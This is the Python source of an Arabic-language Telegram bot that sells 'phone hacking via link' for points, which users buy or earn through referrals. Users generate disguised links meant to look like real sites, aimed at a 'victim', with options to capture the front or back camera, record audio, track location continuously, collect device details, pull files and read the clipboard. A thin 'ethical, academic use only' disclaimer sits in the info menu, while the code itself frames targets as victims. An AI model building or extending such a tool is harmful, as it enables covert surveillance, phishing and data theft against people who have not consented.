# ============================================================
#  bot.py - بوت تيليجرام (أوامر، أزرار، قوائم)
# ============================================================
import time
import threading
import requests
import csv
import io
from datetime import datetime
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import BOT_TOKEN
from database import *
from utils import is_valid_url, create_short_link

bot = TeleBot(BOT_TOKEN)
user_states = {}

# ====== دوال مساعدة ======
def check_subscription(user_id):
    channels = get_required_channels()
    if not channels:
        return True
    for channel in channels:
        try:
            member = bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

def get_invites_count(user_id):
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM invites WHERE inviter_id = ?', (user_id,)).fetchone()[0]
    conn.close()
    return count

# ====== القوائم ======
def main_menu(user_id):
    user = get_user(user_id)
    points = user['points'] if user else 0
    
    daily_available = get_daily_reward(user_id) if user else False
    daily_text = "🎁 نقطة يومية" if daily_available else "⏳ انتظر غداً"
    daily_callback = "daily_reward" if daily_available else "daily_claimed"
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 ابدأ الاختراق", callback_data="start_hack"),
        InlineKeyboardButton("⭐ جمع نقاط", callback_data="earn_points"),
        InlineKeyboardButton(f"💰 رصيدك: {points} نقطة", callback_data="my_balance"),
        InlineKeyboardButton("🛒 شراء نقاط", callback_data="buy_points"),
        InlineKeyboardButton(daily_text, callback_data=daily_callback),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info"),
        InlineKeyboardButton("📞 التواصل مع الدعم", callback_data="support")
    )
    if user and user['is_admin']:
        markup.add(InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel"))
    return markup

def admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("📢 إدارة القنوات", callback_data="admin_channels"),
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
        InlineKeyboardButton("⭐ إدارة النقاط", callback_data="admin_points"),
        InlineKeyboardButton("🎁 مكافآت جماعية", callback_data="admin_group_rewards"),
        InlineKeyboardButton("🔧 إدارة الميزات", callback_data="admin_features"),
        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
    )
    return markup

# ====== أوامر البوت ======
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if len(message.text.split()) > 1:
        invite_code = message.text.split()[1]
        conn = get_db()
        inviter = conn.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,)).fetchone()
        conn.close()
        if inviter and not user:
            invited_by = inviter['user_id']
        else:
            invited_by = None
    else:
        invited_by = None
    
    if not user:
        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '', invited_by)
        user = get_user(user_id)
    
    points = user['points'] if user else 0
    msg = f"""🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**"""
    bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=main_menu(user_id))

@bot.message_handler(commands=['admin'])
def make_admin_cmd(message):
    if message.from_user.id == 6904264075:
        conn = get_db()
        conn.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (message.from_user.id,))
        conn.commit()
        conn.close()
        bot.reply_to(message, "✅ تم تفعيل صلاحيات الإدارة")
    else:
        bot.reply_to(message, "❌ غير مصرح لك")

@bot.message_handler(commands=['add_points'])
def add_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        add_points(target_id, points, f'إضافة من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم إضافة {points} نقاط للمستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['deduct_points'])
def deduct_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /deduct_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        deduct_points(target_id, points, f'خصم من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم خصم {points} نقاط من المستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['set_price'])
def set_price_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /set_price [الميزة] [السعر]")
            return
        feature = parts[1].lower()
        price = int(parts[2])
        valid_features = ['camera', 'audio', 'video', 'location', 'device', 'all']
        if feature not in valid_features:
            bot.reply_to(message, f"❌ الميزة غير صالحة. الميزات المتاحة: {', '.join(valid_features)}")
            return
        set_price(feature, price)
        bot.reply_to(message, f"✅ تم تعيين سعر {feature} إلى {price} نقاط")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['add_channel'])
def add_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_channel [id] [الاسم]")
            return
        channel_id = parts[1]
        channel_name = parts[2]
        add_required_channel(channel_id, channel_name)
        bot.reply_to(message, f"✅ تم إضافة القناة: {channel_name}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['remove_channel'])
def remove_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /remove_channel [id]")
            return
        channel_id = parts[1]
        remove_required_channel(channel_id)
        bot.reply_to(message, f"✅ تم حذف القناة")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['create_reward'])
def create_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ **استخدم:** `/create_reward [عدد النقاط] [عدد الأعضاء]`\nمثال: `/create_reward 50 10`\n\nيعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود")
            return
        points = int(parts[1])
        member_count = int(parts[2])
        code = secrets.token_hex(4).upper()
        create_group_reward(user_id, points, member_count, code)
        bot.reply_to(message, f"""✅ **تم إنشاء المكافأة!**

🔑 **الكود:** `{code}`
⭐ **النقاط:** {points} نقطة لكل مستخدم
👥 **العدد:** {member_count} مستخدم

📌 **للاستخدام:** أرسل هذا الكود للمستخدمين، وسيحصلون على النقاط عند استخدام الأمر:
`/use_reward {code}`""")
    except ValueError:
        bot.reply_to(message, "❌ تأكد من أن الأرقام صحيحة")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(commands=['use_reward'])
def use_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ يرجى استخدام /start أولاً")
        return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ **استخدم:** `/use_reward [الكود]`\nمثال: `/use_reward ABC123`")
            return
        code = parts[1].upper()
        result, data = use_group_reward(code, user_id)
        if result:
            user = get_user(user_id)
            bot.reply_to(message, f"""✅ **تم استلام المكافأة!**

⭐ تم إضافة **{data}** نقاط إلى رصيدك.
💰 رصيدك الحالي: **{user['points']}** نقطة.""")
        else:
            if data == 'already_used':
                bot.reply_to(message, "❌ لقد استخدمت هذا الكود مسبقاً")
            elif data == 'full':
                bot.reply_to(message, "❌ تم استخدام هذا الكود بالكامل (انتهى العدد المحدد)")
            elif data == 'not_found':
                bot.reply_to(message, "❌ الكود غير صحيح")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
def handle_original_url(message):
    user_id = message.from_user.id
    state = user_states.get(user_id, '')
    if not state.startswith('waiting_url_'):
        return
    feature = state.replace('waiting_url_', '')
    original_url = message.text.strip()
    if not is_valid_url(original_url):
        bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
        return
    session_id = create_session(user_id, feature, original_url, {})
    masked_link = create_short_link(session_id, original_url)
    del user_states[user_id]
    bot.reply_to(message, f"""🔗 **تم إنشاء الرابط الملغم**

📌 **الرابط المقنع:**
<code>{masked_link}</code>

🔗 **الرابط الأصلي:**
<code>{original_url}</code>

📋 **الميزة:** {feature}
⏱ الصلاحية: 10 دقائق

⚠️ الرابط يبدو وكأنه من الموقع الأصلي!""", parse_mode='HTML')

# ====== معالجة الأزرار ======
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    # ====== العودة للقائمة ======
    if data == 'back_to_menu':
        user = get_user(user_id)
        points = user['points'] if user else 0
        msg = f"""🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**"""
        bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=main_menu(user_id))
        bot.answer_callback_query(call.id)
        return
    
    # ====== النقطة اليومية ======
    if data == 'daily_reward':
        user = get_user(user_id)
        if not user:
            bot.answer_callback_query(call.id, "❌ يرجى إعادة تشغيل البوت")
            return
        if get_daily_reward(user_id):
            add_points(user_id, 1, 'نقطة يومية')
            claim_daily_reward(user_id)
            user = get_user(user_id)
            msg = f"""🎁 **تم استلام النقطة اليومية!**

⭐ تم إضافة **1 نقطة** إلى رصيدك.
💰 رصيدك الحالي: **{user['points']}** نقطة.

📅 عودة غداً للحصول على نقطة جديدة!"""
            bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")))
            bot.answer_callback_query(call.id, "✅ تم إضافة نقطة")
        else:
            bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    if data == 'daily_claimed':
        bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    # ====== زر "ابدأ الاختراق" ======
    if data == 'start_hack':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
            InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
            InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
            InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
            InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
            InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
            InlineKeyboardButton("📍 تتبع الموقع المستمر", callback_data="location_tracking"),
            InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
            InlineKeyboardButton("📁 سحب الملفات", callback_data="file_exfil"),
            InlineKeyboardButton("📋 الحافظة", callback_data="clipboard"),
            InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
        )
        bot.edit_message_text("🎯 **اختر نوع الاختراق:**\n\nاختر الميزة التي تريد اختبارها على الضحية:", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    # ====== جمع نقاط ======
    if data == 'earn_points':
        user = get_user(user_id)
        invite_link = f"https://t.me/{bot.get_me().username}?start={user['invite_code'] if user else ''}"
        msg = f"""⭐ **جمع نقاط**

📍 **طريقة جمع النقاط:**
• قم بدعوة أصدقائك عبر الرابط الخاص بك
• كل شخص يسجل عبر رابطك يمنحك **1 نقطة**

🔗 **رابط الدعوة الخاص بك:**
<code>{invite_link}</code>

📊 **عدد المدعوين:** {get_invites_count(user_id)}
⭐ **نقاطك الحالية:** {user['points'] if user else 0}"""
        bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='HTML', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")))
        bot.answer_callback_query(call.id)
        return
    
    # ====== رصيدي ======
    if data == 'my_balance':
        user = get_user(user_id)
        msg = f"""💰 **رصيدك الحالي**

⭐ **عدد النقاط:** {user['points'] if user else 0}

📊 **إجمالي النقاط التي حصلت عليها:** {user['total_points'] if user else 0}

📨 **عدد المدعوين:** {get_invites_count(user_id)}

💡 **طرق الربح:**
• دعوة الأصدقاء (+1 نقطة لكل مدعو)
• شراء نقاط (من لوحة الشراء)"""
        bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")))
        bot.answer_callback_query(call.id)
        return
    
    # ====== شراء نقاط ======
    if data == 'buy_points':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⭐ 10 نقاط - 5$", callback_data="buy_10"),
            InlineKeyboardButton("⭐ 25 نقاط - 10$", callback_data="buy_25"),
            InlineKeyboardButton("⭐ 50 نقاط - 18$", callback_data="buy_50"),
            InlineKeyboardButton("⭐ 100 نقاط - 30$", callback_data="buy_100"),
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
        )
        bot.edit_message_text("🛒 **شراء نقاط**\n\nاختر الباقة المناسبة لك:", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    if data.startswith('buy_'):
        points_map = {'buy_10': 10, 'buy_25': 25, 'buy_50': 50, 'buy_100': 100}
        points = points_map.get(data, 0)
        if points:
            bot.send_message(user_id, f"🛒 **طلب شراء {points} نقطة**\n\n📌 للشراء، تواصل مع الدعم:\n@YourSupportUsername\n\nأو استخدم الأمر /contact", parse_mode='Markdown')
            bot.answer_callback_query(call.id, f"✅ تم طلب شراء {points} نقطة")
        return
    
    # ====== معلومات البوت ======
    if data == 'bot_info':
        msg = """ℹ️ **معلومات البوت**

🔬 **الاسم:** بوت اختبار الاختراق
🛡️ **الإصدار:** 2.0
📋 **الوصف:**
هذا البوت مخصص لاختبار الاختراق الأخلاقي.
يسمح لك بإنشاء روابط ملغمة لاختبار أمان الأجهزة.

👨‍💻 **المطور:** @YourDevUsername

⚙️ **الميزات:**
• اختبار الكاميرا (أمامية/خلفية)
• اختبار المايكروفون
• تحديد الموقع الجغرافي
• جمع معلومات الجهاز
• تسجيل الفيديو والصوت

⚠️ **تنبيه:**
هذا البوت للأغراض الأكاديمية والبحثية فقط."""
        bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")))
        bot.answer_callback_query(call.id)
        return
    
    # ====== الدعم ======
    if data == 'support':
        msg = """📞 **التواصل مع الدعم**

📧 **البريد الإلكتروني:** support@example.com
💬 **تيليجرام:** @YourSupportUsername
📱 **الموقع:** https://your-website.com

📌 **للإبلاغ عن مشكلة أو اقتراح:**
استخدم الأمر /contact

🕐 **أوقات العمل:**
من الساعة 10 صباحاً حتى 10 مساءً"""
        bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")))
        bot.answer_callback_query(call.id)
        return
    
    # ====== لوحة الإدارة ======
    if data == 'admin_panel':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.edit_message_text("⚙️ **لوحة الإدارة**", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=admin_panel())
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== الإحصائيات ======
    if data == 'admin_stats':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0] or 0
            total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
            total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
            total_sessions = conn.execute('SELECT COUNT(*) FROM sessions').fetchone()[0]
            admins = conn.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1').fetchone()[0]
            banned = conn.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1').fetchone()[0]
            daily_count = get_daily_reward_count()
            conn.close()
            msg = f"""📊 **إحصائيات البوت**

👥 **المستخدمين:**
• الإجمالي: {total_users}
• المديرين: {admins}
• المحظورين: {banned}

⭐ **النقاط:**
• إجمالي النقاط: {total_points}
• متوسط النقاط: {round(total_points/total_users, 1) if total_users > 0 else 0}

📨 **الدعوات:** {total_invites}
📋 **السجلات:** {total_logs}
🔗 **الجلسات:** {total_sessions}
🎁 **النقاط اليومية اليوم:** {daily_count}"""
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة المستخدمين ======
    if data == 'admin_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('SELECT user_id, username, first_name, last_name, points, is_admin, is_banned, joined_date FROM users ORDER BY user_id DESC LIMIT 20').fetchall()
            conn.close()
            if not users:
                bot.send_message(user_id, "📭 لا يوجد مستخدمين")
                bot.answer_callback_query(call.id)
                return
            msg = "👥 **قائمة المستخدمين (آخر 20):**\n\n"
            for u in users:
                status = "👑" if u['is_admin'] else ("🚫" if u['is_banned'] else "🔹")
                msg += f"{status} **{u['first_name']}**"
                if u['username']:
                    msg += f" (@{u['username']})"
                msg += f"\n🆔 `{u['user_id']}`\n⭐ نقاط: {u['points']}\n📅 {u['joined_date'][:10]}\n\n"
            markup = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("📥 تصدير المستخدمين", callback_data="export_users"), InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== تصدير المستخدمين ======
    if data == 'export_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('SELECT * FROM users').fetchall()
            conn.close()
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Username', 'First Name', 'Last Name', 'Points', 'Total Points', 'Admin', 'Banned', 'Joined Date', 'Invite Code'])
            for u in users:
                writer.writerow([u['user_id'], u['username'] or '', u['first_name'] or '', u['last_name'] or '', u['points'], u['total_points'], u['is_admin'], u['is_banned'], u['joined_date'], u['invite_code']])
            output.seek(0)
            bot.send_document(user_id, ('users.csv', output.getvalue()))
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة القنوات ======
    if data == 'admin_channels':
        user = get_user(user_id)
        if user and user['is_admin']:
            channels = get_required_channels()
            msg = "📢 **القنوات الإجبارية:**\n\n"
            if channels:
                for ch in channels:
                    try:
                        chat = bot.get_chat(ch['channel_id'])
                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
                    except:
                        msg += f"🔹 {ch['channel_id']}\n"
            else:
                msg += "📭 لا توجد قنوات إجبارية\n"
            msg += "\n📌 **الأوامر:**\n`/add_channel [id] [الاسم]` - إضافة قناة\n`/remove_channel [id]` - حذف قناة"
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة النقاط ======
    if data == 'admin_points':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("➕ إضافة نقاط", callback_data="add_points_user"), InlineKeyboardButton("➖ خصم نقاط", callback_data="deduct_points_user"), InlineKeyboardButton("📊 ترتيب النقاط", callback_data="points_leaderboard"), InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text("⭐ **إدارة النقاط**\n\nاختر الإجراء:", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data == 'add_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(user_id, "📝 **إضافة نقاط لمستخدم**\n\nأرسل الأمر بالشكل التالي:\n`/add_points [user_id] [عدد النقاط]`\n\nمثال: `/add_points 123456789 10`")
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data == 'deduct_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(user_id, "📝 **خصم نقاط من مستخدم**\n\nأرسل الأمر بالشكل التالي:\n`/deduct_points [user_id] [عدد النقاط]`\n\nمثال: `/deduct_points 123456789 5`")
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data == 'points_leaderboard':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            top_users = conn.execute('SELECT user_id, username, first_name, points FROM users ORDER BY points DESC LIMIT 10').fetchall()
            conn.close()
            msg = "🏆 **ترتيب المستخدمين حسب النقاط:**\n\n"
            medals = ["🥇", "🥈", "🥉"]
            for i, u in enumerate(top_users):
                medal = medals[i] if i < 3 else f"{i+1}."
                name = u['first_name'] or u['username'] or str(u['user_id'])
                msg += f"{medal} {name} - ⭐ {u['points']}\n"
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إعدادات البوت ======
    if data == 'admin_settings':
        user = get_user(user_id)
        if user and user['is_admin']:
            prices = get_prices()
            msg = "⚙️ **إعدادات البوت (أسعار الميزات)**\n\nالسعر الحالي لكل ميزة:\n"
            feature_names = {'camera': '📷 الكاميرا', 'audio': '🎙 الصوت', 'video': '🎥 الفيديو', 'location': '📍 الموقع', 'device': '📱 معلومات الجهاز', 'all': '🔬 كل الميزات'}
            for key, name in feature_names.items():
                msg += f"• {name}: **{prices.get(key, 5)}** نقاط\n"
            msg += "\n📌 **لتغيير السعر، استخدم الأمر:**\n`/set_price [الميزة] [السعر]`\n\nالميزات المتاحة: `camera`, `audio`, `video`, `location`, `device`, `all`\nمثال: `/set_price camera 3`"
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== المكافآت الجماعية ======
    if data == 'admin_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("➕ إنشاء مكافأة جديدة", callback_data="create_group_reward"), InlineKeyboardButton("📋 قائمة المكافآت", callback_data="list_group_rewards"), InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text("🎁 **المكافآت الجماعية**\n\nأنشئ مكافأة يمكن لعدد محدد من المستخدمين استلامها.\nكل مستخدم يحصل على النقاط المحددة عند استخدام الكود.", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data == 'create_group_reward':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(user_id, "📝 **إنشاء مكافأة جماعية**\n\nأرسل الأمر بالشكل التالي:\n`/create_reward [عدد النقاط] [عدد الأعضاء]`\n\nمثال: `/create_reward 50 10`\n(يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود)")
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data == 'list_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            rewards = conn.execute('SELECT * FROM group_rewards ORDER BY created DESC LIMIT 20').fetchall()
            conn.close()
            if not rewards:
                bot.send_message(user_id, "📭 لا توجد مكافآت سابقة")
                bot.answer_callback_query(call.id)
                return
            msg = "📋 **قائمة المكافآت:**\n\n"
            for r in rewards:
                remaining = r['member_count'] - r['used_count']
                msg += f"🔑 **{r['code']}**\n⭐ {r['points']} نقطة | 👥 {remaining} متبقي\n📅 {r['created'][:10]}\n\n"
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة الميزات ======
    if data == 'admin_features':
        user = get_user(user_id)
        if user and user['is_admin']:
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text("🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    if data.startswith('toggle_'):
        user = get_user(user_id)
        if user and user['is_admin']:
            feature = data.replace('toggle_', '')
            new_status = toggle_feature(feature)
            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
            bot.answer_callback_query(call.id, f"تم {status_text}")
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text(f"🔧 **إدارة الميزات**\n{feature.title()} الآن {status_text}", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== الميزات الأساسية ======
    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all', 'location_tracking', 'file_exfil', 'clipboard']:
        user = get_user(user_id)
        feature_map = {'camera_front': 'camera', 'camera_back': 'camera', 'video_front': 'video', 'video_back': 'video', 'audio': 'audio', 'location': 'location', 'device': 'device', 'all': 'all', 'location_tracking': 'all', 'file_exfil': 'all', 'clipboard': 'all'}
        feature_key = feature_map.get(data, 'all')
        prices = get_prices()
        required_points = prices.get(feature_key, 5)
        if user and user['points'] < required_points:
            bot.answer_callback_query(call.id, f"❌ لا يوجد نقاط كافية! تحتاج {required_points} نقطة.")
            bot.send_message(user_id, f"❌ **نقاط غير كافية!**\n\nهذه الميزة تحتاج **{required_points}** نقطة.\nرصيدك الحالي: **{user['points']}** نقطة.\n\n💡 اشترِ نقاطاً أو ادعُ أصدقاءك لكسب نقاط إضافية.")
            return
        deduct_points(user_id, required_points, f'استخدام {data}')
        user_states[user_id] = f'waiting_url_{data}'
        bot.send_message(user_id, f"📤 أرسل الآن **الرابط الأصلي**\n(الموقع الذي تريد توجيه الضحية إليه)\n\n💡 تم خصم {required_points} نقطة مقابل هذه الخدمة.")
        bot.answer_callback_query(call.id)
        return
    
    bot.answer_callback_query(call.id, "❌ خيار غير معروف")

# ====== تشغيل البوت ======
def run_bot():
    print("🤖 بدء تشغيل البوت...")
    try:
        bot.delete_webhook()
        print("✅ تم حذف Webhook القديم")
    except Exception as e:
        print(f"⚠️ خطأ في حذف Webhook: {e}")
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"⚠️ خطأ في البوت: {e}")
            time.sleep(5)